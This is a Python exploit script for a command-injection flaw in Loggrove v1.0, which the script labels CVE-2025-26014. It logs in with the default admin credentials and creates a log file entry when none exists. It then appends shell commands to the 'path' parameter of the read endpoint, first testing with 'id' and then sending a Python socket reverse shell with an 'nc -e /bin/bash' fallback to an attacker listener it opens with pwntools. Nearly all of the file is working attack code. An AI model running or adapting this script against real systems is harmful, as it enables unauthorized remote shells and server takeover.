#!/usr/bin/env python

'''

    _______    ________    ___   ____ ___   ______     ___   _____ ____ _____ __
   / ____/ |  / / ____/   |__ \ / __ \__ \ / ____/    |__ \ / ___// __ <  / // /
  / /    | | / / __/________/ // / / /_/ //___ \________/ // __ \/ / / / / // /_
 / /___  | |/ / /__/_____/ __// /_/ / __/____/ /_____/ __// /_/ / /_/ / /__  __/
 \____/  |___/_____/    /____/\____/____/_____/     /____/\____/\____/_/  /_/   


 Description 
 -----------
 A Remote Code Execution (RCE) vulnerability in Loggrove v.1.0 allows a remote attacker to execute arbitrary code via the path parameter.
 The manipulation of the argument path from read.py file leads to os command injection. The attack can be launched remotely.
 
 
 Firmware
 --------
 * https://gitee.com/olajowon/loggrove/
'''


import os
import requests
import argparse
import threading
import time
from pwn import *
from bs4 import BeautifulSoup


context.log_level = 'error'  # Set to 'error' (hides most logs)
logging.getLogger("pwnlib").setLevel(logging.ERROR)  # Disable logging for pwntools


class ReverseShell(threading.Thread):

    def __init__(self, listener:str=None, port:int=None)-> None:
        ''' Dummy Reverse Shell '''
        super(ReverseShell, self).__init__()
        self.listener = listener
        self.port = port
        self.exit:bool = False

    def run(self)-> None:
        ''' Interactive Mode'''
        try:
            listener = listen(int(self.port), bindaddr=self.listener)  # Force IPv4
            conn = listener.wait_for_connection()
            conn.interactive(prompt='')

        except KeyboardInterrupt:
            conn.close()
            listener.close()
            sys.exit(0)
        
        except EOFError:
            raise KeyboardInterrupt

        finally:
            pass



class CVE_2025_26014:

    def __init__(self, target:str=None, listener:str=None, port:int=None)-> None:
        self.target:str = target
        self.listener:str = listener
        self.port:int = port
        self.xsrf_token:str = None
        # browser part
        self.session:object = requests.Session()
        self.useragent:dict = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0'}


    def __get_xsrf_value(self, path:str=None)-> str:
        ''' Get cookies xsrf value from current session '''
        xsrf = self.session.get(
                        url=f'{self.target}{path}'
                        , headers=self.useragent
        )
        encoded = xsrf.cookies.get('_xsrf').replace('|', '%7C') # url-encoded
        return encoded



    def __login_using_default_credentials(self, path:str='login/html/')-> int:
        ''' Login to Loggrove using default credentials (admin:loggrove)'''
        self.xsrf_token = self.__get_xsrf_value(path=path)

        payload = {
            '_xsrf':self.xsrf_token,
            'username':'admin',
            'password':'loggrove'
        }
        response = self.session.post(url=f'{self.target}{path[:-5]}', headers=self.useragent, data=payload)
        if response.status_code != 200:
            print('[+] Default login failed â€” credentials seem changed.')
            sys.exit(0)
        return response.status_code

    

    def __check_exists_log(self, path:str='logfiles/')-> dict:
        ''' Check exists logfile '''

        logfile_exists = False
        parameters = {
            'search':'',
            'order':'asc',
            'limit':10
        }
        while not logfile_exists:
            content = self.session.get(url=f'{self.target}{path}', params=parameters)
            content = content.json()['data'][0]
            if len(content) > 0:
                logfile_exists = True
            else:
                # if theres no logfile exists than create one
                self.__create_new_logfile()
        return content



    def __create_new_logfile(self, path:str='logfiles/')-> int:
        ''' Create a new logfile '''
    
        payload = {
            '_xsrf':self.xsrf_token
            , 'name':'btmp'
            , 'path':'/var/log/btmp'
            , 'host':'localhost'
            , 'comment':'CVE-2025-1229'
            , 'monitor_choice':0
        }
        response = self.session.post(url=f'{self.target}{path}', headers=self.useragent, data=payload)
        return response.status_code



    def __exploit_vulnerability(self, path='read/', payload:str=None)-> int:
        ''' Exploit the vulnerability to gain RCE '''

        logfile = self.__check_exists_log()
        logfile['path'] = f'{logfile["path"]} && {payload}'

        parameters = {
            'page':1
            , 'logfile':logfile['name']
            , 'match':''
            , 'path':logfile['path']
            , 'host':logfile['host']
            , 'clean':'true'
            , 'posit':'head'
        }

        exploit = self.session.get(url=f'{self.target}{path}', params=parameters)
        exploit = exploit.json()['data']['contents'][0]
        return exploit



    def run(self)-> None:

        #######################[ Reverse Shell Payload ]#######################

        payload = ''
        # 1st payload
        payload += f'python3 -c'
        payload += f'\'import socket,subprocess,os;'
        payload += f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
        payload += f's.connect(("{self.listener}",{self.port}));'
        payload += f'os.dup2(s.fileno(),0);'
        payload += f'os.dup2(s.fileno(),1);'
        payload += f'os.dup2(s.fileno(),2);'
        payload += f'import pty; pty.spawn("bash")\''
        # 2nd payload
        payload += f'||'
        payload += f'nc -e /bin/bash {self.listener} {self.port}'

        #####################################################################

        revshell = ReverseShell(listener=self.listener, port=self.port)
        revshell.start()
        print('\033[34m[*]\033[37m Trying default login credentials...\033[0m')
        self.__login_using_default_credentials()
        print('\033[34m[*]\033[37m Initializing log handler...\033[0m')
        self.__check_exists_log() # if its not exists -> self.__create_new_logfile()
        print('\033[34m[*]\033[37m Sending crafted malicious request...\033[0m')
        response = self.__exploit_vulnerability(payload='id') # `final step launch the attack` - Elliot Alderson
        if response:
            print(f'\033[32m{response}\033[0m')
            print('\033[34m[+]\033[37m Pwned! Go Ahead!\033[0m')
            self.__exploit_vulnerability(payload=payload)



parser = argparse.ArgumentParser(description="A Remote Code Execution (RCE) vulnerability in Loggrove v.1.0 allows a remote attacker to execute arbitrary code via the path parameter.", usage=f'usage: {sys.argv[0]} [-h] [-t target]  [-l host] [-p port]')
parser.add_argument('-t', '--target', required=True, type=str, metavar='', help='Target URL (example: http://target-server:port)')
parser.add_argument('-l', '--listener', required=True, type=str, metavar='', help='Attacker listening host')
parser.add_argument('-p', '--port', required=False, type=int, metavar='', default=1337, help='Listening on port (default: 1337)')
args = parser.parse_args()



if __name__ == '__main__':
    exploit = CVE_2025_26014(target=args.target, listener=args.listener, port=args.port)
    exploit.run()